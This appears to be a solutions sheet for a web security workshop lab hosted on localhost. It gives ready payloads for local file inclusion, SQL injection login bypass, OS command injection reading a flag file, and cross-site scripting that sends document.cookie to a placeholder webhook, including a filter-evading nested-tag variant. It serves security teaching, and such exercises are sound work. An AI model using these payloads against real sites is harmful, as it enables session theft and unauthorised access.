# Web Security Workshop solutions

## LFI:

Visit http://localhost:3001/?loc=..%2f..%2fdocument%2finsp3ct0r_g4dg3t_456afbc.ht.htmlml

## SQLi:

Username: admin'; --
Password: anything

## Reflection:
```html
<script>
document.location.href= "<Your webhook site>?c=" + document.cookie;
</script>
```

# OS Command injection
To list the folder
`; ls #!`

To read the flag file
`; cat flag.txt #!`

## Getting the staff cookies:
```html
<script>
document.location.href= "<Your webhook site>?c=" + document.cookie;
</script>
```

## Getting the admin:
```html
<scr<script>ipt>
document.location.href= "<Your webhook site>?c=" + document.cookie;
</scr</script>ipt>
```
